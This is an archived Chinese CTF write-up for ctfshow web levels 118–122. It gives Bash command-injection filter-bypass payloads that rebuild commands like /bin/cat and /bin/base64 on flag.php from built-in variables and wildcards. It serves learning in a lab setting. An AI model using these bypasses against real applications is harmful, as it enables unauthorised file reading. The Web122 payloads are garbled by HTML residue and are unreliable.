---
source: "gelusus/wxvl 公众号漏洞文库"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
title: "ctfshow web入门命令执行"
product: "ctfshow Bash过滤靶场"
record_type: "analysis"
document_type: "CTF题解Web118–122"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
prerequisites: "必须Bash而非任意sh，PATH/PWD/HOME/USER/HOSTNAME/SHLVL取值与通配匹配依环境"
side_effects: "原文技术操作的实际副作用未复现核验；按其请求/代码评估状态变更、凭据暴露和业务影响"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96%E8%BD%AF%E4%BB%B6/%E6%9D%82%E9%A1%B9/ctfshow%20web%E5%85%A5%E9%97%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.md"
archive_commit: "41940cb0038d09ca5aaddbe5bffb923e423d210f"
source_status: "missing"
source_note: "原始出处待补；仓库归档不等同原始披露"
id: "vw-103c7c101769f590fe302185"
entity_id: "ve-103c7c101769f590fe302185"
schema_version: "1"
---

# ctfshow web入门命令执行

<!-- vulwiki-editorial-rebuild:system-misc -->
## 条目范围与校订

- 本文对象：ctfshow Bash过滤靶场
- 文献类型：CTF题解Web118–122
- 版本、权限及部署边界：必须Bash而非任意sh，PATH/PWD/HOME/USER/HOSTNAME/SHLVL取值与通配匹配依环境
- 核验状态：仅重建文本校订；未执行文中代码、PoC 或扫描，未把截图或转载声明记为本站复现

### 具体结论与待核项

以下为原归档的逐项勘误与证据缺口；可由文本确定的问题已在下文订正，仍缺来源的事实保持待核。

1. 标题泛命令执行而仅指定5关，需关卡索引；源代码/过滤规则仅截图未视检
2. Web122 <A等被HTML标签解析残片污染、span闭合乱入，当前payload不可直接使用，需回源恢复代码围栏
3. ~C/~A位运算和变量未定义时的算术解释、${#}等含义未阐明；固定环境截字不通用
4. RANDOM多次尝试的概率与Shell版本未说明；不把题解当Bash漏洞

### 操作风险

原文技术操作的实际副作用未复现核验；按其请求/代码评估状态变更、凭据暴露和业务影响

技术请求、代码与实验方法按原文保留；其中的破坏性动作仅限授权、可恢复的隔离环境。缺失代码、参数或版本事实不猜补。

### 来源追溯

- 原始披露 URL 未确认；既有归档来源标签保留，不能替代原始公告

### 归档技术正文

zoe
                    zoe  哦0吼   2026-02-12 23:06  
  
Web118  
  
一个输入框，没有其他提示，查看源代码，发现  
  
尝试输入ls等都被过滤了 ，看其他师傅操作，使用了bash内置变量  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/DBT7MicbvsEwHSedslDjbicfpWo4qzx9ahSh9licU2pwPOKdJ0kTKMibYsDMQ3icXd5gEQksYBt67gyVibvI0TahsmDpvxXsib1OhddcxvrhMoiabDQ/640?wx_fmt=png "")  
  
  
code=${PATH:~C}${PWD:~C} ????.??? 查看源代码得到flag  
  
   
  
  
  
Web119  
  
PATH被过滤了，构造不了nl flag.php，就试试构造其他的。  
  
${HOME:${#HOSTNAME}:${#SHLVL}}  
       
====>  
     
t  
  
   
  
${PWD:${Z}:${#SHLVL}}  
      
====>  
     
/  
  
   
  
/bin/cat flag.php  
  
   
  
${PWD:${#}:${#SHLVL}}???${PWD:${#}:${#SHLVL}}??${HOME:${#HOSTNAME}:${#SHLVL}} ????.???  
  
![](https://mmbiz.qpic.cn/mmbiz_png/DBT7MicbvsEwAx9tTBJfiaaEcpQ6OA6flhorDN7IKvkME4DVdB4XnHRWQNoEteOanCfZibicp6e8p6S1P6Sz6r8knbnebI0Mz8WYczpBJyV7NVk/640?wx_fmt=png "")  
  
Web120  
  
有长度限制，  
  
![](https://mmbiz.qpic.cn/mmbiz_png/DBT7MicbvsEzmkVfrZ8XeMnMelMBj3yfBr7vJNKZjFoftDk46qwDwxswAAiaRicFWsa2p5BicMyaGfe3qWwvowk7v4UDko0iclJ6kPNxKRhic9LjY/640?wx_fmt=png "")  
  
code=${PWD::${#SHLVL}}???${PWD::${#SHLVL}}?${USER:~A}? ????.???查看源代码得到flag  
  
![](https://mmbiz.qpic.cn/mmbiz_png/DBT7MicbvsExvodj3cQ1T93Lib4QcSgOsxpA6rYeyQFCp5nQFnvO5l10dctrHlMgxPFCExjZPicGFjLiceGwIGwE7kibZyBic4wqKy0gdwqFchsu0/640?wx_fmt=png "")  
  
Web121  
  
摇骰子，随机到4位数多发几次就行  
  
/bin/base64 flag.php → /???/?????4 ????.??? → ${PWD::${##}}???${PWD::${##}}?????${#RANDOM} ????.???   
  
![](https://mmbiz.qpic.cn/mmbiz_png/DBT7MicbvsExaMohQx2TzyjAPUkNtS7amF4iaClhSvqqvpcZwOwsjbUtI7Z1WYqZfHTWsY0lfzs81hEJBrufibfN1Q2B8ADnfqsmYDYooFdqlM/640?wx_fmt=png "")  
  
Web122  
  
code=     <A;${HOME::$?}???${HOME::$?}?????${RANDOM::$?} ????.???< span>      </A;${HOME::$?}???${HOME::$?}?????${RANDOM::$?}>  
  
构造错误命令，使$?的结果为1，代替${##}来分割  
  
用命令     <A然后下一条命令中的$?就等价于1了，< span>      </A然后下一条命令中的$?就等价于1了，<>  
  
构造/bin/base64 flag.php => /???/????6? ????.??? =>      <A;${HOME::$?}???${HOME::$?}????${RANDOM::$?}? ????.??? < span>      </A;${HOME::$?}???${HOME::$?}????${RANDOM::$?}?>  
  
要多试几次  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/DBT7MicbvsExxJCHJuzDlOHwSIDMM2Gnhp9n96n4yVBXDCd3GJFKfv5wlGib7IwGOsZWqHT4sGp8ia9YdRSeahWuAeB1C8IEdCFibiaJeF0IicYbk/640?wx_fmt=png "")  
  


---

> 来源：gelusus/wxvl（微信公众号漏洞文章自动归档，原始披露 URL 尚未确认，现有链接按来源追溯区分别标注）
